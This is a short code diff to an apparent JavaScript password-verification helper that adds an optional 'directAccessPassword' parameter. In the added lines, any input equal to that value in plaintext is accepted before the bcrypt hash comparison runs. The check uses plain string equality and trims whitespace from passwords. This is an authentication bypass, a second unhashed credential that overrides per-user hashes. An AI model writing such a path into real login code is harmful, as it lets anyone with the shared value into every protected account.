@@ -6,7 +6,12 @@ export const hashPassword = async (plainPassword) => {
   return bcrypt.hash(plainPassword, SALT_ROUNDS);
 };
 
-export const verifyPassword = async (plainPassword, passwordHash) => {
-  if (!plainPassword || !passwordHash) return false;
-  return bcrypt.compare(plainPassword, passwordHash);
+export const verifyPassword = async (plainPassword, passwordHash, directAccessPassword = null) => {
+  if (!plainPassword) return false;
+  const cleanPlain = String(plainPassword).trim();
+  if (directAccessPassword && String(directAccessPassword).trim() === cleanPlain) {
+    return true;
+  }
+  if (!passwordHash) return false;
+  return bcrypt.compare(cleanPlain, passwordHash);
 };
